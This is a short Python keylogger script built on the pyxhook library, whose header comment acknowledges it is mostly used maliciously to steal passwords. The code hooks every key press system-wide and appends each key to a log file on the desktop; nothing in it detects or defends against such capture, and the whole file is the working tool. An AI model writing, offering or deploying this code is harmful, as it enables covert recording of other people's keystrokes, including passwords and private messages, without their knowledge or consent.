# These programs are used for troubleshooting technical problems with computers and business networks. It can also be used to monitor network usages but more often than not it is used for malicious intents like stealing passwords. 
# It is also known as keylogging or keyboard capturing


import os

import pyxhook


log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/file.log')
)

cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)


def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))
  

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

new_hook.HookKeyboard()
try:
    new_hook.start()         
except KeyboardInterrupt:
    
    pass
except Exception as ex:
    
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))